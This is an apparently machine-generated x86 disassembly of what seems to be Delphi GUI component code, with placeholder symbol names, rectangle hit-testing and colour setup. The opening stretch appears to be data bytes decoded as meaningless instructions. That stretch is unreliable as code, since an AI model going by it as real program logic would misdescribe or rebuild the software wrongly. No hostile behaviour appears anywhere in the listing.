jb r-xdata
jae r-xdata
jb r-xdata
jb r-xdata
add al 0x41
inc edx
jne r-xdata
lodsb [ esi ]
adc [ eax ] al
lodsb [ esi ]
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x66940040 ] cl
dec eax
arpl [ edx + 0x6f ] si
add al 0x68
add [ 0x65646e49 ] al
push esp
inc ebx
jne r-xdata
adc [ eax ] al
mov eax eax
sbb al 0x65
dec eax
add [ eax ] cl
dec ecx
adc [ eax ] al
push esp
push esp
jae r-xdata
add [ eax + 0x54004119 ] ch
rcl ah 0x43
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
push es
adc [ ebx + eax * 2 + 0x68 ] edx
popad
jb r-xdata
inc edi
jb r-xdata
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
dec ecx
outsb
je r-xdata
add [ gs : ecx ] al
jae r-xdata
inc edx
jne r-xdata
push es
pop eax
pop es
dec ecx
outsb
je r-xdata
add [ eax + 0x7 ] ebx
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
or dl [ ebx + eax * 2 + 0x68 ]
popad
jb r-xdata
je r-xdata
add [ eax + 0x8004867 ] bh
push 0x48
add [ eax ] al
add [ eax ] al
add [ eax ] al
0x4867
outsb
je r-xdata
insb
insb
inc ebp
jbe r-xdata
outsb
push edx
arpl [ gs : eax + eax + 0x2 ] si
or [ esi ] al
push ebx
outsb
add [ ecx ] eax
dec ecx
outsb
je r-xdata
jb r-xdata
je r-xdata
add [ esi ] al
dec ecx
outsb
je r-xdata
insb
jne r-xdata
or dl [ esi + 0x61 ]
jb r-xdata
jb r-xdata
je r-xdata
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x4 ] si
jb r-xdata
jb r-xdata
or [ esi ] al
push ebx
outsb
jb r-xdata
js r-xdata
inc ecx
outsb
add [ 0x66696853 ] al
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
adc [ edx + edx * 2 ] eax
push esp
inc ebx
jne r-xdata
je r-xdata
jb r-xdata
js r-xdata
insd
inc ebx
push 0x747261
add eax 0x65646e49
jb r-xdata
je r-xdata
andps xmm1 [ edi + 0x6e ]
inc edi
je r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
inc ebx
push 0x53747261
or al 0x54
pop ecx
pop es
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
add al 0x68
dec eax
pop eax
pop es
dec ecx
outsb
je r-xdata
add [ ecx ] al
push esp
push ebx
push 0x53746669
je r-xdata
add [ ecx + eax * 2 ] eax
push esp
inc ebx
push 0x41747261
js r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
insd
push ebx
outsb
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
inc edx
jne r-xdata
push es
outsb
js r-xdata
dec ecx
jb r-xdata
push 0x48
add [ eax ] al
mov eax eax
fsub [ ebp + 0x48 ]
add [ eax ] cl
push ss
push esp
jb r-xdata
je r-xdata
add [ ebx ] ecx
inc esp
outsd
jne r-xdata
add al 0x0
add ah dh
mov [ 0xffffffffa5200047 ] al
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
jae r-xdata
pushad
inc esp
add [ eax + 0x4800489c ] cl
jpo r-xdata
insb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ esp + edx * 4 + 0x47 ] dh
add [ eax + edx + 0x10ac0040 ] ch
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
xchg esp eax
dec ax
inc edx
jne r-xdata
add al al
aam 0x43
add [ eax + 0x54004119 ] ch
adc [ eax ] al
push esp
adc [ eax ] al
push 0x8004864
add al 0x68
dec eax
add [ esp + edx * 4 + 0x47 ] dh
pop eax
inc ebx
outsd
insb
outsd
jb r-xdata
push es
add [ eax - 0x3ffbfcb ] ah
push 0x32dc0044
inc eax
add al bh
xor al [ eax ]
or [ ebp - 0x6763ffb8 ] al
inc esp
add ah al
inc eax
add [ esi + ebx * 4 + 0x41 ] dh
arpl [ edx + 0x6f ] si
inc ecx
insb
insb
outsd
ja r-xdata
insb
add [ gs : ebx ] ecx
inc esp
add [ eax + ecx * 2 + 0x44 ] dl
add [ eax ] ah
and eax [ eax + eax + 0x58 ]
sbb [ eax + eax - 0x54 ] eax
and al 0x44
add [ esp ] ah
inc esp
add [ eax ] bh
daa
inc esp
add [ eax ] ah
sbb al [ eax + eax + 0x78 ]
dec ebp
inc esp
add [ eax ] bh
and eax [ eax + eax + 0x38 ]
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ ebx + eax * 4 + 0x48 ] bl
add [ eax - 0x37ffbb6d ] dh
inc edx
add [ eax ] bl
cwde
inc esp
add [ eax + ebx - 0x71d3ffbc ] dl
inc esp
add [ esi + ecx * 4 + 0x44 ] cl
add [ ebx + ecx * 4 + 0x44 ] ah
add ah bl
pop ss
inc esp
add al ah
pop ss
inc esp
add [ eax ] ch
dec eax
dec ebp
imul ebp [ esi + 0x6 ] 0x62756f44
insb
add [ gs : ecx + eax * 2 ] eax
dec ebp
popad
js r-xdata
inc ecx
add al 0x41
popad
je r-xdata
dec eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebx + 0x486594c0 ] cl
add [ eax ] cl
adc [ edi + ecx * 2 + 0x6e ] dl
inc edi
je r-xdata
add [ eax + ebp * 2 ] al
dec ecx
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
cmp al 0x11
add al bl
mov [ eax ] cl
loopne r-xdata
inc ebx
push 0x11747261
add al 0x52
outsb
add [ 0x66696853 ] al
je r-xdata
add ah ah
and eax 0x67980044
inc esp
add al bl
dec eax
inc esp
add [ eax + 0x7400477b ] bh
mov [ eax + eax + 0x70 ] es
xchg [ eax + eax + 0x58 ] eax
mov [ eax + eax + 0x34 ] es
int1
inc edx
add [ esp + edx * 2 + 0x62240044 ] al
inc esp
add [ edi + esi * 2 + 0x47 ] ah
add [ edi + ebx * 2 ] cl
inc esp
add [ ebx * 2 + 0x62bc0044 ] bh
inc esp
add al al
bound eax [ eax + eax + 0x78 ]
popad
inc esp
add [ eax ] ah
popad
inc esp
add [ eax - 0x7ffbb73 ] bl
stosb [ edi ]
inc esp
add ah dh
inc edx
add [ edx + ecx * 4 ] dl
inc esp
add [ ecx * 4 + 0x78e00044 ] al
inc edi
add [ esi + eax * 2 + 0x77580048 ] dh
inc edi
add [ edi + esi * 2 + 0x7fb00047 ] bl
inc edi
add [ eax - 0x57ffb887 ] ah
jle r-xdata
inc eax
add [ eax ] al
add al 0x0
add [ edi ] al
add ch dl
call ebx
call esp
jmp edx
inc edi
add [ eax - 0x2bffb87b ] dl
cdq
dec eax
add [ esp + ebx * 4 ] bh
dec eax
add al bh
mov [ eax ] cl
inc esp
mov [ eax ] cl
in al 0x89
dec eax
add [ esi + esi + 0x4c200048 ] cl
dec eax
add [ eax + 0x74004885 ] bl
xchg [ eax ] ecx
call 0x848aff8
cwde
dec eax
add [ ebx * 4 - 0x62d3ffb8 ] ah
dec eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx ] bh
pop eax
pop es
add [ ecx ] al
push esp
push ebx
push 0x53746669
je r-xdata
jb r-xdata
je r-xdata
js r-xdata
sub_4878ac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_487970
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41d818
mov edx 0x20000000
mov eax esi
call sub_41d9c8
mov eax [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0xc ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_4879c4
push ebx
mov ebx eax
mov eax ebx
call sub_41d994
test eax eax
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_41d994
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
pop ebx
retn
sub_4879ec
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403314
mov [ edi + 0x18 ] esi
mov [ edi + 0x4 ] 0x20000000
mov [ edi + 0xc ] 0x1
mov [ edi + 0x1c ] 0x20000000
mov eax [ edi + 0x18 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0xd0 ]
push eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_487970
mov [ edi + 0x8 ] eax
mov eax [ edi + 0x18 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0xd0 ]
push eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_472a2c
mov [ edi + 0x10 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_487a74
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
call sub_403344
mov eax [ esi + 0x8 ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414988
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_487ab8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4149b4
mov edi esi
mov edx [ edi + 0x8 ]
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ edi + 0x4 ]
mov [ ebx + 0x4 ] eax
mov al [ edi + 0xc ]
mov [ ebx + 0xc ] al
mov edx [ edi + 0x10 ]
mov eax [ ebx + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_487b0c
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
call sub_41dadc
cmp al 0x1
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x8 ]
call sub_4879c4
test al al
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov al 0x1
pop ebx
retn
sub_487b80
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_478778
mov [ ebx + 0x14 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov esi eax
mov [ ebx + 0x1c ] esi
mov eax [ ebx + 0x4 ]
mov [ esi + 0x24 ] eax
mov eax [ eax ]
mov eax [ eax + 0xd0 ]
mov [ esi + 0x20 ] eax
mov [ ebx + 0x30 ] 0x1
mov [ ebx + 0xd ] 0x2
mov eax [ ebx + 0x8 ]
mov edx 0xff0000
call sub_41d1d4
mov [ ebx + 0x34 ] 0xff0000
mov al [ r-xdata ]
mov [ ebx + 0x38 ] al
mov eax [ ebx + 0x4 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0xd0 ]
push eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_472ad8
mov [ ebx + 0x18 ] eax
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x4 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0xd0 ]
push eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_487970
mov [ ebx + 0x10 ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_487c49
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_478814
pop edi
pop esi
pop ebx
retn
mov edi esi
mov al [ edi + 0xc ]
mov [ ebx + 0xc ] al
mov al [ edi + 0xd ]
mov [ ebx + 0xd ] al
mov edx [ edi + 0x10 ]
mov eax [ ebx + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov edx [ edi + 0x18 ]
mov eax [ ebx + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ edi + 0x1c ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov al [ edi + 0x30 ]
mov [ ebx + 0x30 ] al
sub_487cac
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_487d38
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41d3e4
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
call sub_477368
mov edx [ ebp - 0x8 ]
pop eax
call sub_4044a0
jne r-xdata
mov al 0x1
mov eax ebx
call sub_41d458
mov edi eax
call sub_477308
cmp edi eax
jne r-xdata
mov eax [ ebx + 0x18 ]
cmp eax [ esi + 0x34 ]
jne r-xdata
mov eax ebx
call sub_41d494
mov dl [ esi + 0x38 ]
cmp dl al
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_487d3f
lea eax [ ebp - 0x8 ]
call sub_404094
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_487d48
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x1c ]
call sub_403344
mov eax [ esi + 0x18 ]
call sub_403344
mov eax [ esi + 0x10 ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4787e4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_487df4
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx edi
mov eax esi
call sub_412edc
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea eax [ ebx + 0x20 ]
push eax
call PtInRect
test eax eax
jne r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_487e34
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x288 ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp [ edx + 0xd ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
sar eax 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov esi [ edx - 0x14 ]
mov edx [ ebp + 0x8 ]
add esi [ edx - 0xc ]
sar esi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov esi [ edx - 0xc ]
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
sar eax 0x1
jns r-xdata
add esi eax
jmp r-xdata
adc eax 0x0
sar eax 0x1
jns r-xdata
adc esi 0x0
sub esi eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + 0x288 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x98 ]
test al al
je r-xdata
sub esi eax
adc eax 0x0
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x5c ]
push 0x0
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x124 ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_487f00
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x19 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403a98#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xdc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + 0x288 ]
mov eax ebx
call sub_472f94
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x20000000
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41dadc
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41dadc
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41cd14
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_41dae4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebx + 0x10 ]
call sub_41d9c8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41d9c0
cmp eax 0x20000000
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_41d6b8
cmp eax 0x20000000
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x18 ]
cmp [ ebx + 0x21 ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
mov dl 0x1
call sub_41dae4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41d9c0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_487dd8
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_41dae4
jmp r-xdata
mov [ ebp - 0x29 ] al
cmp [ ebp - 0x29 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
call sub_41d7e4
jmp r-xdata
mov ecx [ edx + 0x29a ]
sub ecx eax
mov [ ebp - 0x8 ] ecx
add ecx 0x5
mov [ ebp - 0x10 ] ecx
mov ecx [ edx + 0x292 ]
add ecx eax
mov [ ebp - 0x10 ] ecx
sub ecx 0x5
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov ecx [ edx + 0x28e ]
add ecx eax
mov [ ebp - 0x14 ] ecx
cmp [ ebp - 0x19 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x288 ]
mov eax [ eax + 0xc ]
mov dl 0x5
call sub_41d7bc
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x288 ]
mov eax [ eax + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
call sub_41d7e4
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov edx [ edx + 0x296 ]
sub edx eax
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
lea edi [ eax + 0x20 ]
lea esi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ ebp - 0x29 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ eax ]
call [ edx + 0x14 ]
imul [ ebp - 0x20 ]
mov edx [ ebp - 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ eax ]
call [ edx + 0x14 ]
imul [ ebp - 0x20 ]
add eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
jmp r-xdata
cmp [ ebp - 0x19 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x288 ]
mov eax [ eax + 0x10 ]
call sub_41dadc
cmp al 0x1
je r-xdata
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x20
push eax
call InflateRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x288 ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x29 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x288 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
xor eax eax
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x288 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x1c ]
cmp [ ebp - 0x19 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x18 ]
add [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x20 ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0xd ]
sub al 0x1
jb r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x29 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x20 ]
mov [ ebp - 0x10 ] eax
push ebp
lea ecx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x38 ]
call sub_487e34
pop ecx
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
dec ebx
cmp ebx 0xffffffff
jne r-xdata
inc esi
xor ebx ebx
mov eax [ edx ]
add eax [ ebp - 0x28 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
je r-xdata
inc ebx
dec esi
jne r-xdata
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
add eax 0x28e
cmp [ ebp - 0x19 ] 0x0
je r-xdata
cmp [ ebp - 0x19 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x8 ] eax
push ebp
lea ecx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x34 ]
call sub_487e34
pop ecx
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
inc ebx
dec esi
jne r-xdata
jmp r-xdata
mov eax [ edx + 0x8 ]
sub eax [ ebp - 0x28 ]
mov [ edx ] eax
jmp r-xdata
dec al
je r-xdata
lea ecx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x288 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x8 ]
add edx [ rw-data ]
mov [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x24 ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp - 0x24 ]
add [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ edx ]
add eax [ edx + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_477d94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488348
lea eax [ ebp - 0x38 ]
mov edx 0x3
call sub_4040b8
retn
mov ecx [ ebp - 0x28 ]
sar ecx 0x1
jns r-xdata
adc eax 0x0
mov ebx eax
sub ebx ecx
mov [ edx ] ebx
add eax ecx
mov [ edx + 0x8 ] eax
adc ecx 0x0
sub_488353
inc [ ecx ]
add [ eax ] al
add [ edi ] dl
add [ eax ] al
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_4884dc
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_483530
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_487b80
mov [ ebx + 0x3b8 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_487b80
mov [ ebx + 0x35c ] eax
test [ ebx + 0x1c ] 0x10
je r-xdata
add esp 0xfffffff0
call sub_403668
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4879ec
mov esi eax
mov [ ebx + 0x354 ] esi
mov eax [ esi + 0x8 ]
mov dl 0x1
call sub_41dae4
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4879ec
mov esi eax
mov [ ebx + 0x360 ] esi
mov edx 0x80ffff
mov eax esi
call sub_487b60
mov eax [ esi + 0x4 ]
mov [ esi + 0x1c ] eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_489dd8
mov [ ebx + 0x364 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4879ec
mov esi eax
mov [ ebx + 0x358 ] esi
mov edx 0xffffff
mov eax esi
call sub_487b60
mov eax [ esi + 0x4 ]
mov [ esi + 0x1c ] eax
mov [ ebx + 0x28d ] 0x0
mov [ ebx + 0x368 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4884e3
lea eax [ ebp - 0x8 ]
call sub_404094
retn
lea edx [ ebp - 0x108 ]
mov eax [ ebx ]
call sub_403294
lea edx [ ebp - 0x108 ]
lea eax [ ebp - 0x8 ]
call sub_4042f8
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x3b8 ]
mov eax [ eax + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebx + 0x35c ]
mov esi [ eax + 0x8 ]
mov edx 0xff
mov eax esi
call sub_41d1d4
call sub_477308
mov edx eax
mov eax esi
call sub_41d474
mov dl [ r-xdata ]
mov eax esi
call sub_41d4a0
mov eax [ ebx + 0x35c ]
mov [ eax + 0x34 ] 0xff
mov dl [ r-xdata ]
mov [ eax + 0x38 ] dl
sub_488505
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x3b8 ]
call sub_403344
mov eax [ esi + 0x35c ]
call sub_403344
lea eax [ esi + 0x354 ]
call sub_40d6a0
